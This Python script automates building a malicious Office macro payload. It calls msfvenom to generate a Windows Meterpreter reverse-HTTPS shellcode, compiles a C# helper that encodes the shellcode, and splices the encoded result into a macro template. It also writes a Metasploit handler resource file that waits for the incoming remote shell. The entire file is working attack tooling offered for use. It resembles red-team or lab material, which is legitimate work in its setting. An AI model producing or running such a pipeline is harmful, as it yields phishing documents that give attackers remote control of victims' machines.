import os
import subprocess
import re
import argparse

# Create argument parser to handle command line arguments
parser = argparse.ArgumentParser(description='Generate shellcode with specified LHOST and LPORT')
parser.add_argument('--LHOST', required=True, help='LHOST value')
parser.add_argument('--LPORT', required=True, help='LPORT value')

# Parse the provided command line arguments
args = parser.parse_args()

# Generate the shellcode using msfvenom. The output format is set to C# and saved to a text file.
msfvenom_command = f"msfvenom -p windows/meterpreter/reverse_https LHOST={args.LHOST} LPORT={args.LPORT} EXITFUNC=thread -f csharp -o vbs.txt"
os.system(msfvenom_command)

# Read the generated shellcode from the text file
with open("vbs.txt", "r") as f:
    shellcode = f.read()

# Read the contents of the original VBS-Helper.cs file
with open("VBS-Helper.cs", "r") as f:
    vbs_helper_content = f.read()

# Replace the placeholder in the VBS-Helper.cs file with the generated shellcode
vbs_helper_content = re.sub(r'!!!SHELLCODE!!!', shellcode, vbs_helper_content)

# Write the modified contents to a new .cs file
with open("VBS-Helper_modified.cs", "w") as f:
    f.write(vbs_helper_content)

# Compile the modified .cs file into an executable
compile_command = "mcs -platform:x64 -unsafe -r:System.Configuration.Install VBS-Helper_modified.cs -out:VBS-Helper.exe"
subprocess.run(compile_command, shell=True, check=True)

# Execute the compiled program using mono
run_command = "mono VBS-Helper.exe"
os.system(run_command)

# Read the encoded shellcode that was generated by the executed program
with open("encoded_shellcode.txt", "r") as f:
    encoded_shellcode = f.read()

# Read the contents of the macros.txt file
with open("macros.txt", "r") as f:
    macro_content = f.read()

# Replace the placeholder in the macros.txt content with the encoded shellcode
macro_content = re.sub(r'!!!ENCRYPTEDSHELLCODE!!!', encoded_shellcode, macro_content)

# Write the modified macro content to a new text file
with open("macro_encrypted.txt", "w") as f:
    f.write(macro_content)

# Create a Metasploit resource file for handling incoming connections
with open("met32.rc", "w") as f:
    f.write(f"use exploit/multi/handler\n")
    f.write(f"set payload windows/meterpreter/reverse_https\n")
    f.write(f"set LHOST {args.LHOST}\n")
    f.write(f"set LPORT {args.LPORT}\n")
    f.write(f"set exitfunc thread\n")
    f.write(f"run -j\n")
